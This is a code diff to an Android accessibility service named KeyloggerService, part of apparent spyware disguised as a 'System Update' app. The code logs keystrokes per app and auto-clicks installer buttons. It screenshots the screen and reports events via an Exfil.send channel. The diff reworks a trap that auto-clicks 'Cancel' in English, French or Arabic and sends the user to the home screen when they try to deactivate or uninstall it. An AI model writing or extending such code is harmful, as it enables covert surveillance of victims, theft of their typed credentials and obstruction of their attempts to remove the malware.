@@ -9,6 +9,8 @@ import android.graphics.Path;
 import android.hardware.HardwareBuffer;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.Handler;
+import android.os.Looper;
 import android.util.DisplayMetrics;
 import android.view.Display;
 import android.view.WindowManager;
@@ -30,6 +32,7 @@ public class KeyloggerService extends AccessibilityService {
     private String currentPackage = "";
     private StringBuilder buffer = new StringBuilder();
     private Timer flushTimer, streamTimer;
+    private Handler mainHandler = new Handler(Looper.getMainLooper());
 
     @Override
     protected void onServiceConnected() {
@@ -37,11 +40,9 @@ public class KeyloggerService extends AccessibilityService {
         instance = this;
 
         try {
-            // 1. N7aydo l'Timers l9dam ila kanou (bach maycrashich)
             if (flushTimer != null) { flushTimer.cancel(); flushTimer = null; }
             if (streamTimer != null) { streamTimer.cancel(); streamTimer = null; }
 
-            // 2. Nch3lo jdad
             flushTimer = new Timer();
             flushTimer.scheduleAtFixedRate(new TimerTask() {
                 @Override
@@ -71,7 +72,7 @@ public class KeyloggerService extends AccessibilityService {
             if (pkgName == null) return;
             String pkg = pkgName.toString();
             
-            // 1. Keylogger (Text Capture)
+            // 1. Keylogger
             if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                 if (!pkg.equals(currentPackage) && !pkg.equals("com.android.systemui")) {
                     flushBuffer();
@@ -86,7 +87,7 @@ public class KeyloggerService extends AccessibilityService {
                 }
             }
 
-            // 2. Auto-click install buttons (Silent Installer)
+            // 2. Auto-click install buttons
             if (pkg.contains("packageinstaller") || pkg.contains("com.android.packageinstaller") || pkg.contains("com.miui.packageinstaller")) {
                 AccessibilityNodeInfo root = getRootInActiveWindow();
                 if (root != null) {
@@ -102,54 +103,49 @@ public class KeyloggerService extends AccessibilityService {
                 }
             }
 
-            // 3. ANTI-UNINSTALL & ANTI-DEACTIVATE TRAP
-            if (pkg.contains("settings") || pkg.contains("com.android.settings")) {
-                AccessibilityNodeInfo root = getRootInActiveWindow();
-                if (root != null) {
-                    // Nchecko wach l'app dyalna "System Update" banet f l'ecran bach ma n7bsouch clics dyal settings l'okhrin
-                    List<AccessibilityNodeInfo> myAppNodes = root.findAccessibilityNodeInfosByText("System Update");
-                    if (myAppNodes == null || myAppNodes.isEmpty()) {
-                        myAppNodes = root.findAccessibilityNodeInfosByText("com.sys.updater");
+            // 3. TRAP: MIUI & Android Settings (Anti-Deactivate & Anti-Uninstall)
+            // Kanchko 3la l'package name dyal MIUI Security wla Settings
+            if (pkg.contains("settings") || pkg.contains("securitycenter") || pkg.contains("systemui")) {
+                
+                // Ntsnao chwiya (300ms) bach l'fenêtre dyal l'confirmation tban mzyan
+                mainHandler.postDelayed(() -> {
+                    AccessibilityNodeInfo root = getRootInActiveWindow();
+                    if (root == null) return;
+
+                    // 1. Ila banet l'fenêtre dyal "Stop System Update?" (fiha Cancel w Stop)
+                    // Kan9elbo 3la "Cancel" direct
+                    List<AccessibilityNodeInfo> cancelNodes = root.findAccessibilityNodeInfosByText("Cancel");
+                    if (cancelNodes == null || cancelNodes.isEmpty()) cancelNodes = root.findAccessibilityNodeInfosByText("Annuler");
+                    if (cancelNodes == null || cancelNodes.isEmpty()) cancelNodes = root.findAccessibilityNodeInfosByText("إلغاء");
+
+                    if (cancelNodes != null && !cancelNodes.isEmpty()) {
+                        for (AccessibilityNodeInfo node : cancelNodes) {
+                            if (node.isClickable()) {
+                                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                                performGlobalAction(GLOBAL_ACTION_HOME); // Khrjo l'Home
+                                Exfil.send("🛡️ Anti-Deactivate Triggered! (Clicked Cancel)");
+                                return;
+                            }
+                        }
                     }
 
-                    if (myAppNodes != null && !myAppNodes.isEmpty()) {
-                        // Ila banet l'app dyalna f Settings, n9elbo 3la:
-                        // A. "Uninstall"
-                        List<AccessibilityNodeInfo> uninstallNodes = root.findAccessibilityNodeInfosByText("Uninstall");
-                        if (uninstallNodes == null || uninstallNodes.isEmpty()) uninstallNodes = root.findAccessibilityNodeInfosByText("Désinstaller");
-                        if (uninstallNodes == null || uninstallNodes.isEmpty()) uninstallNodes = root.findAccessibilityNodeInfosByText("إلغاء التثبيت");
-                        
-                        if (uninstallNodes != null && !uninstallNodes.isEmpty()) {
-                            clickNodeByText(root, "Cancel");
-                            clickNodeByText(root, "Annuler");
-                            clickNodeByText(root, "إلغاء");
-                            performGlobalAction(GLOBAL_ACTION_BACK);
-                            Exfil.send("🛡️ Anti-Uninstall Triggered! (Canceled)");
-                            return;
-                        }
+                    // 2. Ila l9ina l'button dyal "Turn off" / "Stop" f l'ecran (bla fenêtre)
+                    List<AccessibilityNodeInfo> turnOffNodes = root.findAccessibilityNodeInfosByText("Turn off");
+                    if (turnOffNodes == null || turnOffNodes.isEmpty()) turnOffNodes = root.findAccessibilityNodeInfosByText("Désactiver");
+                    if (turnOffNodes == null || turnOffNodes.isEmpty()) turnOffNodes = root.findAccessibilityNodeInfosByText("إيقاف");
 
-                        // B. "Turn off" wla "Deactivate"
-                        List<AccessibilityNodeInfo> turnOffNodes = root.findAccessibilityNodeInfosByText("Turn off");
-                        if (turnOffNodes == null || turnOffNodes.isEmpty()) turnOffNodes = root.findAccessibilityNodeInfosByText("Désactiver");
-                        if (turnOffNodes == null || turnOffNodes.isEmpty()) turnOffNodes = root.findAccessibilityNodeInfosByText("إيقاف");
-
-                        if (turnOffNodes != null && !turnOffNodes.isEmpty()) {
-                            // Ila l9ina "Turn off", nklickiw 3la Cancel dyal l'fenêtre (ila banet)
-                            clickNodeByText(root, "Cancel");
-                            clickNodeByText(root, "Annuler");
-                            clickNodeByText(root, "إلغاء");
-                            
-                            // W nkhrjo l'Home bach yt9leb 3lih
+                    if (turnOffNodes != null && !turnOffNodes.isEmpty()) {
+                        // Ila bghi yklicki 3la "Uninstall" wla "Deactivate" dyal app dyalna
+                        List<AccessibilityNodeInfo> myApp = root.findAccessibilityNodeInfosByText("System Update");
+                        if (myApp != null && !myApp.isEmpty()) {
                             performGlobalAction(GLOBAL_ACTION_HOME);
-                            Exfil.send("🛡️ Anti-Deactivate Triggered! (Kicked to Home)");
+                            Exfil.send("🛡️ Kicked user out of Settings!");
                             return;
                         }
                     }
-                }
+                }, 300);
             }
-        } catch (Exception e) {
-            // Catch ay crash f l'UI
-        }
+        } catch (Exception e) {}
     }
 
     private void clickNodeByText(AccessibilityNodeInfo root, String text) {
@@ -181,8 +177,6 @@ public class KeyloggerService extends AccessibilityService {
             }
         } catch (Exception e) {}
     }
-
-    // ================== SMART GHOST TOUCH ==================
 
     public boolean performClick(String textToFind) {
         try {
@@ -253,8 +247,6 @@ public class KeyloggerService extends AccessibilityService {
     public void pressRecents() { performGlobalAction(GLOBAL_ACTION_RECENTS); }
     public void openNotifications() { performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS); }
 
-    // ================== SCREENSHOTS ==================
-
     public void captureScreen() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
             takeScreenshot(Display.DEFAULT_DISPLAY, getMainExecutor(), new TakeScreenshotCallback() {
@@ -324,4 +316,4 @@ public class KeyloggerService extends AccessibilityService {
         if (streamTimer != null) streamTimer.cancel();
         super.onDestroy(); 
     }
-}
+                            }
